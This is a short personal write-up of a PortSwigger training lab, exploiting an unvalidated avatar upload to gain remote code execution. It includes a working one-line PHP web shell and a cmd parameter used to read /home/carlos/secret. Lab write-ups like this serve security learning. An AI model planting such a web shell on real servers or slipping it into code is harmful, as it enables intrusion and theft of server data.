---
created: 2026-03-26
tags:
  - note
  - journal
  - cyberStuff
title: portswigger Lab - Remote code execution via web shell upload writeup
date: 2026-03-26T11:29:50.036Z
lastmod: 2026-03-26T11:42:55.575Z
---
Long title , i wanted to share this with you because is other solution then the one pressented in by portswigger and i found it myself , i am quite proud of this right now.

> Cool ,so the description is :\
> This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.
>
> To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.
>
> You can log in to your own account using the following credentials: `wiener:peter`

After we login with the provided credentials, go to `My Account` section.\
![](/images/blog-ul-meu/static/Pasted%20image%2020260326073645.png)\
create a .php file and upload the file as a `Avatar` . The php file should have the content below:

```
<?php echo "Shell";system($_GET['cmd']); ?>
```

we going to get this message\
![](/images/blog-ul-meu/static/Pasted%20image%2020260326073945.png)\
we know that it is uploaded, lets try to access it at /files/avatars/webshell.php\
![](/images/blog-ul-meu/static/Pasted%20image%2020260326074033.png)\
for whatever reason it displays Shell, i dont know why.\
Now lets try to modify our `cmd` parameter with` ?cmd=cat /home/carlos/secret`\
![](/images/blog-ul-meu/static/Pasted%20image%2020260326074243.png)\
and boom we solve the lab coo
